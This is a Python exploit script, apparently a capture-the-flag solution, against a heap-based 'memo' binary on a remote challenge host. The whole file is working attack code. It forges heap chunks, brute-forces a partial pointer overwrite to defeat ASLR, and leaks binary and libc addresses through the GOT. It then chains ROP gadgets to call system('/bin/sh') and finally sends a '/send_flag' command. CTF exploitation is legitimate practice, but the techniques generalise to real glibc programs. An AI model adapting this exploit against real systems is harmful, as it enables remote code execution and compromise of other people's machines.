#!/usr/bin/env python
from inv_memo import *

bin_file = './memo'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenge', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.set_item('offset_stack', debug = p16(0xc580), local = '\x00', remote = '\x00')
env.select('remote')

#==========

binf = ELF(bin_file)
offset_main_puts = 0xc54

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    fake_chunk = [0]*8
    fake_chunk[1] = 0x21;
    fake_chunk[5] = 0x11;
    fake_chunk[7] = 0x11;

    iv = InvisibleMemo(conn, ''.join(map(p64, fake_chunk))[:-1])
    iv.newkey(''.join(map(p64, fake_chunk))[:0x10])

    for _ in range(7):
        iv.add(0x18, None, 0x100)
    for _ in range(7):
        iv.add(0x28, None, 0x100)
    for _ in range(7):
        iv.add(0x88, None, 0x100)

    iv.delete(2, -1)
    iv.add(0x88, None, 0x100)

    iv.newkey(p64(0)+p64(0x183))
    x = iv.add(0x178, p64(1) + env.offset_stack, 0x40)  # 1/16 (?)

    conn.sendafter('> ', ('2'.ljust(0xb, 'x') + '\xff').ljust(0x18, 'y') + chr(0x31))
    conn.sendlineafter('id > ', str(2))

    iv.key = p64(0).ljust(0x38, '\x00') + chr(0x33)
    iv.add(0x28, p16(0x4000 + offset_main_puts), 0x18)  # 1/16

    binf.address    = u(conn.recvuntil('\n', drop=True)) - (offset_main_puts+8)
    info('addr_bin_base    = 0x{:08x}'.format(binf.address))
    addr_got_main   = binf.got['__libc_start_main']
    addr_bss        = binf.sep_section['.bss']
    addr_buffer     = addr_bss + 0x800

    conn.sendafter('... ', p64(0)+p64(0x31))
    iv.delete(x)
    iv.newkey(p64(0)+p64(0x31)+p64(0))

    fast_3 = iv.add(0x28, 'a'*4)
    iv.newkey(''.join(map(p64, fake_chunk))[:-1])
    iv.delete(fast_3)
    iv.add(0x88, None, 0x100)

    rop = ROP(binf)
    rop.puts(addr_got_main)
    rop.getnline(addr_buffer, 0x400)
    rop.call(rop.leave)

    iv.newkey(p64(0)+p64(0x183))
    iv.add(0x178, p64(addr_buffer) + str(rop), 0x90)
    conn.sendlineafter('> ', '0')

    conn.recvuntil('Bye!\n')
    addr_libc_main  = u(conn.recvuntil('\n', drop=True))
    libc.address    = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(libc)
    rop.call(rop.ret)
    rop.system(addr_buffer)

    conn.send('/bin/sh\x00' + str(rop))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    if env.check('remote'):
        comn.run(attack)
        comn.connection.sendline('/send_flag')
    else:
        comn.bruteforce(attack)
        comn.connection.interactive()

#==========
